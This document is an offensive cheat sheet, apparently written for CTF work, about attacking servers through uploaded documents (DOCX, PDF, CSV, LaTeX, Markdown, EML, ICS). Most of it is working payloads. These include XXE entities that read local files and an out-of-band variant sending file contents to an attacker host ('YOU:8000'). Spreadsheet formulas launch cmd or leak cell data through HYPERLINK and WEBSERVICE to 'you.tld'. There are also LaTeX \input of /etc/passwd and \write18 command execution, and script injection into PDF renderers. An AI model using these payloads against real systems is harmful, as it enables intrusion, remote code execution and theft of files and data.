# Document Attacks — DOCX/XLSX/PDF/CSV/ODF and the parsers behind them

## The map — document type to attack surface

| Upload | Parser likely | Attack |
|---|---|---|
| .docx/.xlsx/.pptx | POI, OpenXML, python-docx, PHPWord | XXE inside the zip, zip-slip |
| .odt/.ods | ODF parsers | XXE, manifest tricks |
| .pdf | renderer/converter (gs, poppler, headless chrome) | JS-in-PDF, ghostscript, polyglot PHP |
| .csv/.tsv | spreadsheet import, pandas | formula injection, cell injection |
| .xml/.xslt | XML parsers | XXE direct — `web-xxe` skill |
| .tex/.bib | LaTeX compilers | `\input`, `\write18` RCE |
| .md/.rst | markdown renderers | XSS, template injection |
| .epub | epub renderers (zip+xhtml) | XXE + XSS + zip-slip |
| .eml/.msg | mail parsers | HTML injection in rendered view |
| .ics | calendar parsers | injection into rendered events |

## Office Open XML — docx/xlsx/pptx

### XXE — the standard play

docx is a zip of XML parts. Insert the entity into a part the app parses
and *renders back*:

```xml
<!-- word/document.xml -->
<!DOCTYPE w:document [
  <!ENTITY x SYSTEM "file:///flag">
]>
<w:document ...>...<w:t>&x;</w:t>...</w:document>
```

Targets for the `&x;` value: `w:t` text runs, `dc:title`/`dc:creator` in
`docProps/core.xml` (metadata fields the app echoes), sheet cell values in
`xl/sharedStrings.xml`/`sheetN.xml`. If nothing reflects, OOB:

```xml
<!DOCTYPE w:document [
  <!ENTITY % f SYSTEM "file:///flag">
  <!ENTITY % e "<!ENTITY ex SYSTEM 'http://YOU:8000/x?d=%f;'>">
  %e; %ex;
]>
```

`php -r`/LibXML on the server resolves entities; POI usually does not —
identify the parser from error text/dependency list.

### Embedded content inside office files

- OLE objects / embedded packages — docx can embed executables; whether
  the app re-serves them intact
- remote-template/attached-template references — `.dotx` URL the consumer
  fetches (SSRF when the app re-opens the doc)
- docx `settings.xml` RSIDs and macro-enabled `.docm` — macros only run
  on a client open; CTF rarely

### Zip-slip inside docx — `archive-attacks.md`

docx is a zip; if the app *extracts* it (theme import, doc processing),
entry-name traversal applies.

## PDF

### The three PDF attack surfaces

1. **JavaScript inside the PDF** — `/OpenAction`/`/AA` with `/JS` — runs
   in Acrobat/some viewers, NOT in headless renderers; mostly dead in CTF
   unless the app opens it in a scriptable viewer
2. **Ghostscript/converter** — `.pdf` rendered via gs → `%pipe%`/`file`
   primitives → `image-attacks.md`
3. **PDF+PHP polyglot** — `%PDF` prefix + `<?php` — when a "must parse as
   PDF" validator gates an admin file-write (`apexsurvive` shape: PDF
   bytes inside the content stream satisfying the parseable-PDF check,
   payload carried inside the file that lands over a template)

### PDF generation sinks — when the app MAKES pdfs

Reverse direction: fields you upload/control (name, title, html) get
*rendered into* a generated PDF by wkhtmltopdf/puppeteer/weasyprint —
HTML/JS injection into the renderer → file read in the rendered PDF +
`tools/web/pdf_text.py --find-flag` to extract it back:

```html
<script>
document.write('<img src="file:///flag">');      // weak
fetch('file:///flag').then(r=>r.text()).then(t=>document.body.innerText=t);
</script>
<!-- weasyprint/wkhtmltopdf direct form: -->
<iframe src="file:///flag"></iframe>
```

`pdf_text.py` on the produced PDF reads the flag out of the rendered text.

## CSV / spreadsheet injection

The cell-content formula family — the attack runs when a spreadsheet app
(Excel/LibreOffice/the app's own renderer) opens it:

```
=cmd|'/C calc'!A0
=SYSTEM("calc")
=HYPERLINK("http://you.tld/?d="&A1)
=IMPORTXML("http://you.tld/x","//x")
=WEBSERVICE("http://you.tld")
=DDE("cmd";"/C calc";"!A0")
+1+2+cmd|'/C calc'!A0
-cmd|'/C calc'!A0
@SUM(1+1)
```

CTF use is usually formula-injection → data exfil via `HYPERLINK` when an
admin/viewer opens it, OR the app's own renderer (SheetJS, LibreOffice
headless, pandas `read_csv` is safe). Also: giant-cell/row DoS, delimiter
confusion, formula→external-fetch SSRF in converters.

## LaTeX — `.tex` upload compiled server-side

```latex
\input{/etc/passwd}
\immediate\write18{id > /tmp/o}
\newread\f \openin\f=/flag \read\f to\line \line
```

`write18`/`--shell-escape` gives direct RCE; without it `\input`/`\read`
exfiltrate via the produced document. Check for `pdflatex`/`xelatex` in
the pipeline (error text, `-shell-escape` flag in source).

## Markdown — `.md` rendered

- HTML pass-through: `<img onerror>`/`<script>` in permissive renderers
- `[x](javascript:alert(1))` links
- `{{template}}`/`${}` expressions if the md lands in a template context
- `[x](file:///flag)` fetch by the renderer — SSRF/LFI in PDF/doc pipelines

## EML/MSG — mail document

- HTML body rendered in a webmail/ticket view → XSS
- attachment inside the .eml → second-order file delivery
- `cid:`/`data:` URIs, quoted-printable smuggling

## ICS — calendar

- `SUMMARY:`/`DESCRIPTION:` fields rendered unescaped → XSS in the viewer
- `ATTACH;FMTTYPE=`/`URL:` fields fetched by the consumer
- `VALUE=URI` parameter injection

## The universal check — what reads it back

Every document attack needs a *consumer*:

```
the app re-serves the file        → XSS/XML in the file reaches a browser
the app parses and echoes fields  → XXE/injected content reaches a response
the app renders/converts          → renderer primitives (gs/chrome/latex)
a person/bot opens it             → formula/macro attacks (bot-scope only)
```

No consumer = storage. Find the consumer first — `detection.md`.

## Falsifiers

- the document is stored and never opened by any parser/renderer/bot
- the parser is hardened: entities disabled (`LIBXML_NONET`+noent),
  formulas sanitized, `write18` off

## Output to record

- the parser/consumer identified + the field that reflects injected content
- the verbatim response excerpt or OOB hit carrying the flag/content
